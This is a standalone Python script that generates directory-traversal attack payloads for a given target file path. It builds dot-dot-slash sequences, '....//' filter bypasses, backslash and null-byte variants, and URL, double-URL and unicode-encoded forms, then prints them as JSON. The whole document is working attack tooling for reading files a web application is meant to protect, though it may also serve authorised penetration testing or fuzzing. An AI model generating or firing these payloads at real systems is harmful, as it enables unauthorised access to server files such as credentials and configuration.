import sys, json

def url_encode(s):
    out=''
    for c in s:
        out += '%%%02x' % ord(c)
    return out

def double_url_encode(s):
    return url_encode(url_encode(s))

def unicode_encode(s):
    out=''
    for c in s:
        if c == '.':
            out += '%u002e'
        elif c == '/':
            out += '%u002f'
        elif c == '\\':
            out += '%u005c'
        else:
            out += c
    return out

def gen_base_variants(target):
    # Strip leading slash for relative target
    t = target.lstrip('/').lstrip('\\')
    variants = []
    variants.append(('../' + t, 'Single dot-dot-slash traversal'))
    variants.append(('../../' + t, 'Double dot-dot-slash traversal'))
    variants.append(('../../../' + t, 'Triple dot-dot-slash traversal'))
    variants.append(('../../../../' + t, 'Quadruple dot-dot-slash traversal'))
    variants.append(('../../../../../' + t, 'Quintuple dot-dot-slash traversal'))
    variants.append(('....//' + t, 'Bypass filter with ....//'))
    variants.append(('....//....//....//' + t, 'Triple ....// bypass'))
    variants.append(('..\\..\\..\\' + t.replace('/', '\\'), 'Windows-style backslash traversal'))
    variants.append(('..//..//..//' + t, 'Double-slash traversal'))
    variants.append(('../../../' + t + '\x00', 'Null byte termination'))
    variants.append(('./../../' + t, 'Leading current-dir prefix'))
    variants.append(('/..' * 5 + '/' + t, 'Absolute-style /.. traversal'))
    return variants

def build_payloads(target, encoding):
    base = gen_base_variants(target)
    results = []
    encs = []
    if encoding == 'all':
        encs = ['none','url','double_url','unicode']
    else:
        encs = [encoding]
    for enc in encs:
        for payload, desc in base:
            if enc == 'none':
                p = payload
            elif enc == 'url':
                p = url_encode(payload)
            elif enc == 'double_url':
                p = double_url_encode(payload)
            elif enc == 'unicode':
                p = unicode_encode(payload)
            else:
                p = payload
            results.append({'payload': p, 'encoding': enc, 'description': desc})
    return results

def main():
    data = sys.stdin.read().split('\n')
    target = data[0].strip() if len(data) > 0 else ''
    encoding = data[1].strip() if len(data) > 1 else 'none'
    if encoding not in ('none','url','double_url','unicode','all'):
        encoding = 'none'
    payloads = build_payloads(target, encoding)
    print(json.dumps(payloads, ensure_ascii=False, sort_keys=True))

main()
